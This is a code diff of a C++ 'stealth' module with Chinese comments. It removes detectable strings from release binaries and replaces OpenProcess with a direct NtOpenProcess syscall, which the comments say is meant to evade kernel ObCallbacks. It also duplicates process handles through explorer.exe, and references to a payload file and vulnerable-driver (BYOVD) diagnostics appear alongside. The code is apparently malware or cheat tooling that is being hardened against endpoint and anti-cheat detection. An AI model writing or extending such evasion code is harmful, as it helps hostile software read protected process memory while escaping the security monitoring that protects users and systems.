@@ -15,6 +15,13 @@ namespace stealth {
 
 // 本地诊断日志 — 写 %TEMP%\sd.log (与 payload.cpp 的 DiagLog 同一文件)
 // ★ BUILD 549: 文件名脱敏 (原 stealth_diag.log, 含 "stealth" 特征)
+// ★ BUILD 551: ProcDiag 条件编译消除 (与 ByovdDiag/DiagLog 同策略)
+//   原因: 21 处 ProcDiag 调用包含 "EnumerateProcesses:"/"GetProcessModules:"/
+//         "B549:SP:01"~"B549:SP:12" 等明文格式字符串
+//   策略: NDEBUG 时宏化为 ((void)0), 字符串不进入 .rdata
+#ifdef NDEBUG
+    #define ProcDiag(fmt, ...) ((void)0)
+#else
 static void ProcDiag(const char* fmt, ...) {
     char buf[256];
     va_list args;
@@ -33,6 +40,7 @@ static void ProcDiag(const char* fmt, ...) {
         CloseHandle(h);
     }
 }
+#endif  // NDEBUG
 
 // 手动转小写辅助函数 (避免 CRT 依赖)
 static void MakeLowerW(wchar_t* str, size_t len) {
@@ -242,7 +250,10 @@ HANDLE StealthProcess::OpenProcessMinimal(DWORD pid) {
     // 注意: 直接使用 kernel32!OpenProcess 反而更自然
     // 因为几乎所有程序都会调用它
     // 关键是不使用 WriteProcessMemory+VirtualProtectEx 组合
-    return OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+    // ★ BUILD 551: 改用 STEALTH_OPEN_PROCESS (syscall NtOpenProcess, 规避 ObCallbacks)
+    HANDLE hProc = nullptr;
+    STEALTH_OPEN_PROCESS(hProc, PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, pid);
+    return hProc;
 }
 
 HANDLE StealthProcess::DuplicateHandleFromLowRisk(DWORD pid) {
@@ -255,10 +266,12 @@ HANDLE StealthProcess::DuplicateHandleFromLowRisk(DWORD pid) {
     int procCount = EnumerateProcesses(L"explorer.exe", processes, 16);
     if (procCount == 0) return nullptr;
 
-    HANDLE hMediator = OpenProcess(PROCESS_DUP_HANDLE, FALSE, processes[0].pid);
+    HANDLE hMediator = nullptr;
+    STEALTH_OPEN_PROCESS(hMediator, PROCESS_DUP_HANDLE, processes[0].pid);
     if (!hMediator) return nullptr;
 
-    HANDLE hTarget = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
+    HANDLE hTarget = nullptr;
+    STEALTH_OPEN_PROCESS(hTarget, PROCESS_DUP_HANDLE, pid);
     if (!hTarget) {
         CloseHandle(hMediator);
         return nullptr;
